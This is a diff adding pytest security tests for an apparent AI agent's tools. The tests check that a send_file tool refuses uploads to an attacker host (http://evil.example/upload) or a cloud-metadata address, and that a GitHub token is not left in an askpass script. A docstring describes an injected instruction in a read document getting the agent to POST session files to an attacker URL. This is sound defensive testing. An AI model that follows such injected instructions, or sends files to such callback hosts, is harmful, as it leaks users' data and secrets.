@@ -998,3 +998,104 @@ class TestHarnessInjectionOverwrite:
         ))
         assert registry.received["data_path"] == "/tmp/trusted-session"
         assert registry.received["session_id"] == "trusted-session"
+
+
+# ─── S4: send_file destination restriction ───────────────────────────────────
+
+class TestSendFileDestination:
+    """callback_url is an exfiltration channel when unrestricted: one injected
+    instruction in any read document can ask for a session file to be POSTed
+    to an attacker URL. Uploads are restricted to the configured file server."""
+
+    def _fn(self, tool):
+        return tool.fn if hasattr(tool, "fn") else tool
+
+    def test_callback_refused_without_file_server(self, tmp_path, monkeypatch):
+        f = self._fn(bash_mod.send_file)
+        p = tmp_path / "f.txt"
+        p.write_text("secret")
+        monkeypatch.setattr(bash_mod, "FILE_SERVER_URL", "")
+        out = json.loads(f(path=str(p), callback_url="http://evil.example/upload",
+                           data_path=str(tmp_path)))
+        assert out["status"] == "refused"
+        assert "evil.example" not in out.get("download_url", "")
+
+    def test_callback_refused_for_foreign_host(self, tmp_path, monkeypatch):
+        f = self._fn(bash_mod.send_file)
+        p = tmp_path / "f.txt"
+        p.write_text("secret")
+        monkeypatch.setattr(bash_mod, "FILE_SERVER_URL", "http://10.0.0.5:9000")
+        out = json.loads(f(path=str(p), callback_url="http://evil.example/upload",
+                           data_path=str(tmp_path)))
+        assert out["status"] == "refused"
+
+    def test_callback_allowed_for_file_server(self, tmp_path, monkeypatch):
+        f = self._fn(bash_mod.send_file)
+        p = tmp_path / "f.txt"
+        p.write_text("mine")
+        # A LAN file server is the normal deployment (onit.py computes
+        # http://<local_ip>:<port>), so the SSRF screen must be satisfied by
+        # resolution, not by the literal host: patch the resolver, not the URL.
+        monkeypatch.setattr(bash_mod, "FILE_SERVER_URL", "http://files.local:9000")
+        monkeypatch.setattr(bash_mod, "assert_public_url", lambda url: None)
+
+        posted = {}
+
+        class _Resp:
+            status_code = 200
+
+            def raise_for_status(self):
+                pass
+
+        def _fake_post(method, url, timeout=None, **kwargs):
+            posted["url"] = url
+            return _Resp()
+
+        monkeypatch.setattr(bash_mod, "safe_fetch", _fake_post)
+        out = json.loads(f(path=str(p), callback_url="http://files.local:9000/uploads/s1",
+                           data_path=str(tmp_path)))
+        assert out["status"] == "uploaded", out
+        assert posted["url"] == "http://files.local:9000/uploads/s1/"
+
+    def test_private_callback_refused_even_if_configured(self, tmp_path, monkeypatch):
+        """Defense in depth: a configured-but-private destination still goes
+        through the SSRF screen."""
+        f = self._fn(bash_mod.send_file)
+        p = tmp_path / "f.txt"
+        p.write_text("mine")
+        monkeypatch.setattr(bash_mod, "FILE_SERVER_URL",
+                            "http://169.254.169.254:9000")
+        out = json.loads(f(path=str(p), callback_url="http://169.254.169.254:9000/uploads/s1",
+                           data_path=str(tmp_path)))
+        assert out["status"] == "refused"
+
+
+# ─── S5: askpass token not at rest ───────────────────────────────────────────
+
+class TestAskpassToken:
+    """The askpass script used to embed the GitHub token verbatim, leaving it
+    readable in the session tmp dir for the session's lifetime."""
+
+    def _fn(self, tool):
+        return tool.fn if hasattr(tool, "fn") else tool
+
+    def test_script_holds_no_token(self, tmp_path, monkeypatch):
+        monkeypatch.setenv("GITHUB_TOKEN", "ghp_supersecret")
+        env = {"GITHUB_TOKEN": "ghp_supersecret"}
+        bash_mod._inject_github_credentials(env, str(tmp_path))
+        script = (tmp_path / "git_askpass.sh").read_text()
+        assert "ghp_supersecret" not in script
+        # The token lives in a 0o600 file the script reads at call time.
+        token_file = tmp_path / "git_token"
+        assert token_file.read_text() == "ghp_supersecret"
+        assert (token_file.stat().st_mode & 0o077) == 0
+        assert env["ONIT_GITHUB_TOKEN_FILE"] == str(token_file)
+
+    def test_cleanup_removes_token_files(self, tmp_path, monkeypatch):
+        monkeypatch.setenv("GITHUB_TOKEN", "ghp_supersecret")
+        env = {"GITHUB_TOKEN": "ghp_supersecret"}
+        bash_mod._inject_github_credentials(env, str(tmp_path))
+        assert (tmp_path / "git_token").is_file()
+        bash_mod._cleanup_askpass(str(tmp_path))
+        assert not (tmp_path / "git_token").is_file()
+        assert not (tmp_path / "git_askpass.sh").is_file()
